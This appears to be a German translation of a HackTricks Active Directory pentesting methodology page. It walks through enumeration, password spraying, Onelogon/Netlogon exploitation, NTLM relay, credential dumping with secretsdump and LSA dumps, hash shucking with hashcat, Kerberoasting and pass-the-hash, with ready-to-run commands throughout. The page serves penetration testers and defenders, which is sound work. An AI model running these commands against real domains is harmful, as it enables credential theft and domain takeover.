# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** dient als grundlegende Technologie und ermöglicht es **Netzwerkadministratoren**, **domains**, **users** und **objects** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist für die Skalierung ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in verwaltbare **groups** und **subgroups**, während **access rights** auf verschiedenen Ebenen kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten wie **users** oder **devices**, die eine gemeinsame Datenbank verwenden. **Trees** sind Gruppen dieser domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** stellt die Sammlung mehrerer trees dar, die durch **trust relationships** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können bestimmte **access**- und **communication rights** festgelegt werden.

Zu den wichtigsten Konzepten innerhalb von **Active Directory** gehören:

1. **Directory** – Enthält alle Informationen zu Active-Directory-Objekten.
2. **Object** – Bezeichnet Entitäten innerhalb des Verzeichnisses, einschließlich **users**, **groups** oder **shared folders**.
3. **Domain** – Dient als Container für Verzeichnisobjekte. Mehrere domains können innerhalb eines **forest** koexistieren, wobei jede ihre eigene Objektsammlung verwaltet.
4. **Tree** – Eine Gruppierung von domains, die eine gemeinsame Root-Domain verwenden.
5. **Forest** – Die höchste Ebene der Organisationsstruktur in Active Directory, bestehend aus mehreren trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfassen eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisieren die Datenspeicherung und verwalten die Interaktionen zwischen **users** und **domains**, einschließlich **authentication**- und **search**-Funktionen.
2. **Certificate Services** – Überwachen die Erstellung, Verteilung und Verwaltung sicherer **digital certificates**.
3. **Lightweight Directory Services** – Unterstützen verzeichnisfähige Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bieten **single-sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen hinweg innerhalb einer einzigen Sitzung zu authentifizieren.
5. **Rights Management** – Unterstützt den Schutz urheberrechtlich geschützten Materials, indem dessen unbefugte Verteilung und Nutzung reguliert werden.
6. **DNS Service** – Ist für die Auflösung von **domain names** entscheidend.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um ein **AD anzugreifen**, musst du den **Kerberos authentication process** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie es funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine Übersicht darüber, welche Befehle du zur Enumeration bzw. zum **Exploit** eines AD ausführen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen vollständig qualifizierten Domainnamen (FQDN)**, damit der Client ein Ticket für den korrekten SPN erhalten kann. Beim Zugriff auf einen Computer über seine IP-Adresse wird häufig auf NTLM anstelle von Kerberos zurückgegriffen.

## Recon Active Directory (No creds/sessions)

Wenn du lediglich Zugriff auf eine AD-Umgebung hast, aber über keine Credentials/Sessions verfügst, könntest du Folgendes tun:

- **Pentest des Netzwerks:**
- Scanne das Netzwerk, finde Computer und offene Ports und versuche, **vulnerabilities zu exploiten** oder **credentials** daraus zu **extrahieren** (beispielsweise können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
- Eine DNS-Enumeration kann Informationen über wichtige Server in der Domain liefern, etwa Webserver, Drucker, Shares, VPN, Medien usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Sieh dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um weitere Informationen dazu zu erhalten.
- **Prüfe den Null- und Guest-Zugriff auf SMB-Services** (dies funktioniert bei modernen Windows-Versionen nicht):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine ausführlichere Anleitung zur Enumeration von LDAP findest du hier (achte **besonders auf den anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Vergifte das Netzwerk**
- Sammle Credentials, indem du [**Services mit Responder impersonierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Erhalte Zugriff auf Hosts, indem du [**den relay attack ausnutzt**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sammle Credentials, indem du [**gefälschte UPnP-Services mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **exposest**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Services (hauptsächlich dem Web) innerhalb der Domain-Umgebungen sowie aus öffentlich verfügbaren Quellen.
- Wenn du die vollständigen Namen von Mitarbeitern eines Unternehmens findest, kannst du verschiedene AD-**username conventions (**[**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (jeweils 3 Buchstaben), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Sieh dir die Seiten zu [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) an.
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefordert wird**, antwortet der Server mit dem **Kerberos error**-Code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. Dadurch können wir feststellen, dass der Benutzername ungültig war. **Gültige Benutzernamen** führen entweder zu einem **TGT** in einer AS-REP-Antwort oder zum Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_, der angibt, dass der Benutzer eine Pre-Authentication durchführen muss.
- **No Authentication gegen MS-NRPC**: Verwendung von auth-level = 1 (No authentication) gegen das MS-NRPC-(Netlogon-)Interface auf Domain Controllern. Die Methode ruft nach dem Binden an das MS-NRPC-Interface die Funktion `DsrGetDcNameEx2` auf, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Recherche findest du [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch eine **User Enumeration gegen ihn** durchführen. Zum Beispiel könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listen mit Benutzernamen findest du in [**diesem github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Du solltest jedoch die **Namen der Personen, die im Unternehmen arbeiten**, aus dem Recon-Schritt haben, den du zuvor durchgeführt haben solltest. Mit Vor- und Nachnamen könntest du das Script [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Missbrauch der Allow-List für verwundbare Netlogon-Kanäle (Onelogon)

Auch nachdem **Zerologon** auf dem DC gepatcht wurde, können explizit auf die Allow-List gesetzte Accounts weiterhin dem **legacy/vulnerable Netlogon secure-channel-Verhalten** ausgesetzt sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Bei diesem Wert handelt es sich um einen **SDDL security descriptor** (siehe [Security Descriptors](security-descriptors.md)). Jeder Account oder jede Gruppe, der bzw. die über die entsprechende ACE in der DACL verfügt, kann angegriffen werden. Beispielsweise setzt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** auf die Allow-List.

Praktischer Operator-Workflow:

1. **Identifiziere Allow-List-Principals**, indem du sowohl **SYSVOL/GPO** als auch die **Live-DC-Registry** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs** zu echten AD-Benutzern/Computern auf und priorisiere **DC machine accounts**, **trust accounts** und andere privilegierte Computer.
3. Versuche wiederholt eine **MS-NRPC / Netlogon authentication** als der auf der Allow-List befindliche Account.
4. Nach einem erfolgreichen Treffer missbrauche **Netlogon password-setting**, um das Passwort des Ziel-Accounts zurückzusetzen (der öffentliche PoC setzt es auf einen leeren String).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artefakt:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Hinweise:

- Der **Scanner** ist nützlich, weil die effektive allow-list in **SYSVOL**, in der **Registry** oder in beiden vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain-Controller-Computerkontos** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt weiterführende Pfade zur **AD-Übernahme** ermöglichen kann.
- Die **Brute-Force-Durchführbarkeit** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, eine **24-Bit**-Brute-Force, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zu Detection / Hardening:

- Überprüfe die allow-list-Richtlinie und entferne alles außer temporären, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache die **System**-Ereignisse **5827/5828/5829/5830/5831** auf DCs, um verwundbare Netlogon-Verbindungen zu erkennen, die abgelehnt, entdeckt oder durch die Richtlinie ausdrücklich erlaubt wurden.
- Behandle Konten in `VulnerableChannelAllowList` als **hochriskant**, bis die Legacy-Abhängigkeit entfernt wurde.

### Einen oder mehrere Benutzernamen kennen

Du weißt also, dass du bereits einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht besitzt**, kannst du für diesen Benutzer eine **AS_REP-Nachricht anfordern**, die einige durch eine Ableitung des Benutzerpassworts verschlüsselte Daten enthält.
- [**Password Spraying**](password-spraying.md): Versuche die **gängigsten Passwörter** mit jedem der entdeckten Benutzer. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachte dabei die Passwort-Richtlinie!).
- Beachte, dass du auch **OWA-Server sprühen** kannst, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du einige Challenge-**Hashes** erhalten, indem du bestimmte Protokolle des **Netzwerks** per **Poisoning** manipulierst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Aufzählung von Active Directory liefert potenzielle Konten, Hosts und Dienste, die dazu gebracht werden können, sich zu authentifizieren. Nutze diesen Kontext, um geeignete NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und potenzielle Pfade in die AD-Umgebung zu identifizieren.

### NetExec workspace-driven Recon & Relay-Posture-Checks

- Verwende **`nxcdb` workspaces**, um den Status der AD-Reconnaissance pro Engagement zu speichern: `workspace create <name>` erstellt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsle die Ansicht mit `proto smb|mssql|winrm` und liste mit `creds` die gesammelten Secrets auf. Lösche sensible Daten nach Abschluss manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** liefert **Domain**, **OS-Build**, **SMB-Signaturanforderungen** und **Null Auth**. Mitglieder mit `(signing:False)` sind **relay-anfällig**, während DCs häufig Signaturen erfordern.
- Erzeuge **Hostnamen in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** durch Signierung, prüfe weiterhin die **LDAP**-Sicherheitslage: `netexec ldap <dc>` hebt `(signing:None)` / schwaches Channel Binding hervor. Ein DC mit erforderlicher SMB-Signierung, aber deaktivierter LDAP-Signierung, bleibt ein geeignetes **relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Leaks von Drucker-Credentials auf Client-Seite → umfangreiche Validierung von Domain-Credentials

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Das Anzeigen des Quelltexts bzw. der Devtools kann Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerspezifischen Passwörtern enthalten. Beim Testen die Zuordnungen beibehalten:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Wenn du mit dem **null oder guest user** auf **andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die bei einem Zugriff eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder gecachten Credentials per Brute-Force zu testen, übergibst du die NT-Hashes an die NT-candidate-Modi von Hashcat und lässt die Wiederverwendung von Passwörtern validieren, ohne jemals den Klartext zu erfahren. Dies ist besonders wirkungsvoll nach einer Domain-Kompromittierung, bei der du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Verwende shucking, wenn:

- Du ein NT-Corpus aus DCSync-, SAM/SECURITY-Dumps oder Credential Vaults hast und die Wiederverwendung in anderen Domains/Forests testen musst.
- Du RC4-basierte Kerberos-Daten (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Responses oder DCC/DCC2-Blobs erfasst.
- Du die Wiederverwendung langer, nicht crackbarer Passphrasen schnell nachweisen und anschließend über Pass-the-Hash pivotieren möchtest.

Die Technik funktioniert **nicht** gegen Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos-Etype 17/18 AES). Wenn eine Domain nur AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Erstellen eines NT-Hash-Corpus

- **DCSync/NTDS** – Verwende `secretsdump.py` mit history, um die größtmögliche Menge an NT-Hashes (einschließlich ihrer vorherigen Werte) zu erfassen:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Weitere Möglichkeiten zum Sammeln von NTDS-Secrets findest du hier:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und gecachte Domain-Logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben Liste `nt_candidates.txt` hinzu.
- **Metadaten nachverfolgen** – Bewahre den Benutzernamen/die Domain auf, aus denen jeder Hash stammt (auch wenn die Wordlist nur Hex-Werte enthält). Übereinstimmende Hashes zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem vertrauenswürdigen Forest; dadurch maximierst du die Wahrscheinlichkeit einer Überschneidung beim shucking.

#### Hashcat-NT-candidate-Modi

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-candidate-Eingaben **müssen rohe NT-Hashes mit 32 Hex-Zeichen bleiben**. Deaktiviere Rule Engines (kein `-r`, keine Hybrid-Modi), da das Mangling das Schlüsselmaterial des Kandidaten beschädigt.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist deutlich günstiger, als den gesamten Passwort-Keyspace im langsamen Format zu durchsuchen.
- Verwende immer den **aktuellsten Hashcat-Build** (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) benötigen das Klartextpasswort, da ihre Schlüssel per PBKDF2 aus UTF-16LE-Passwörtern und nicht aus rohen NT-Hashes abgeleitet werden.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse mit einem Benutzer mit niedrigen Privilegien ein RC4-TGS für einen Ziel-SPN (siehe die Kerberoast-Seite für Details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Führe shucking des Tickets mit deiner NT-Liste durch:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...`-Blob. Eine Übereinstimmung bestätigt, dass der Service-Account einen deiner vorhandenen NT-Hashes verwendet.

3. Pivotiere sofort über PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls erforderlich.

#### Beispiel – Gecachte Credentials (Modus 31600)

1. Dump gecachter Logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile des interessanten Domain-Benutzers in `dcc2_highpriv.txt` und führe shucking durch:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Eine erfolgreiche Übereinstimmung liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist damit, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe ihn im schnellen NTLM-Modus per Brute-Force aus, um den String wiederherzustellen.

Derselbe Workflow gilt für NetNTLM-Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald eine Übereinstimmung identifiziert wurde, kannst du Relay, SMB/WMI/WinRM-PtH starten oder den NT-Hash offline mit Masks/Rules erneut cracken.



## Active Directory MIT Credentials/Session enumerieren

Für diese Phase musst du die **Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert haben.** Wenn du über gültige Credentials oder eine Shell als Domain-Benutzer verfügst, **solltest du daran denken, dass die zuvor genannten Optionen weiterhin Möglichkeiten zur Kompromittierung anderer Benutzer darstellen**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos-Double-Hop-Problem** verstehen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die Kompromittierung eines Accounts ist ein **großer Schritt zur Bewertung der Domain**, da sie eine authentifizierte **Active-Directory-Enumeration** ermöglicht:

Im Zusammenhang mit [**ASREPRoast**](asreproast.md) kannst du jetzt jeden potenziell verwundbaren Benutzer finden. Beim [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter sowie neue vielversprechende Passwörter ausprobieren.

- Du kannst die [**CMD für eine grundlegende Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden.
- Du kannst auch [**powershell für Recon**](../basic-powershell-for-pentesters/index.html) verwenden, was unauffälliger ist.
- Du kannst außerdem [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren.
- Ein weiteres hervorragendes Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (abhängig von den verwendeten Collection-Methoden), aber **wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo Benutzer RDP verwenden können, finde Pfade zu anderen Gruppen usw.
- **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records der AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch die LDAP-Datenbank mit **ldapsearch** durchsuchen, um nach Credentials in den Feldern _userPassword_ und _unixUserPassword_ oder sogar nach _Description_ zu suchen. Siehe [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools ausprobieren:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

Es ist sehr einfach, alle Domain-Benutzernamen unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein wirkt, ist er der wichtigste Teil überhaupt. Öffne die Links (hauptsächlich die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder festzustellen, dass nichts möglich ist.

### Kerberoast

Kerberoasting umfasst das Abrufen von **TGS-Tickets**, die von an Benutzer-Accounts gebundenen Services verwendet werden, und das **Offline-Cracken** ihrer Verschlüsselung, die auf Benutzerpasswörtern basiert.

Mehr dazu findest du hier:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald du einige Credentials erhalten hast, kannst du prüfen, ob du Zugriff auf eine **Machine** hast. Dafür kannst du **CrackMapExec** verwenden, um mit verschiedenen Protokollen Verbindungen zu mehreren Servern herzustellen, entsprechend deinen Port-Scans.

### Lokale Privilege Escalation

Wenn du Credentials oder eine Session als regulärer Domain-Benutzer kompromittiert hast und auf **eine beliebige Machine in der Domain zugreifen** kannst, suche nach einem Pfad zur **lokalen Privilege Escalation und zum Sammeln von Credentials**. Lokale Administratorrechte können dir ermöglichen, **Hashes anderer Benutzer** aus dem Speicher (LSASS) und dem lokalen Speicher (SAM) zu **dumpen**.

In diesem Buch gibt es eine vollständige Seite über [**lokale Privilege Escalation unter Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Vergiss außerdem nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Aktuelle Session-Tickets

Es ist sehr **unwahrscheinlich**, dass du in der aktuellen Benutzer-Session **Tickets** findest, die dir die **Berechtigung zum Zugriff** auf unerwartete Ressourcen geben. Du kannst jedoch Folgendes prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mit Domain-Credentials oder einer User-Session solltest du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration- und Coercion-Techniken können Relay-Pfade aufdecken, die während der unauthentifizierten Reconnaissance nicht verfügbar waren.

### Nach Creds in Computer Shares suchen | SMB Shares

Da du nun über einige grundlegende Credentials verfügst, solltest du prüfen, ob du **interessante Dateien finden kannst, die innerhalb der AD freigegeben sind**. Du könntest dies manuell tun, aber es ist eine sehr langweilige, repetitive Aufgabe (vor allem, wenn du Hunderte von Dokumenten findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über die Tools zu erfahren, die du verwenden könntest.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du **auf andere PCs oder Shares zugreifen kannst**, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die bei einem Zugriff **eine NTLM-Authentifizierung gegen dich auslöst**, sodass du die **NTLM challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten User, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation auf Active Directory MIT privilegierten Credentials/einer privilegierten Session

**Für die folgenden Techniken reicht ein regulärer Domain-User nicht aus; du benötigst spezielle Berechtigungen/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

